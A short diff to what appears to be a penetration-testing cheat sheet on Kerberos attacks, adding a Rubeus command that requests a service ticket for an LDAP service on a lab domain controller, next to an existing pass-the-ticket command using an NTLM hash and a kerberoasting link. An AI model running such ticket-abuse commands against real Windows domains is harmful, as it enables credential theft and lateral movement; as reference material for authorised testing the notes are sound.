@@ -35,6 +35,10 @@ Request ticket (TGT) based on username and password/hash:
 
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
+Request Service ticket (TGS) based on Service Name:
+
+```rubeus.exe asktgs /user:admin /ticket:doIDF== /service:LDAP/dc1.ecorp.lab```
+
 # Roasting
 https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 
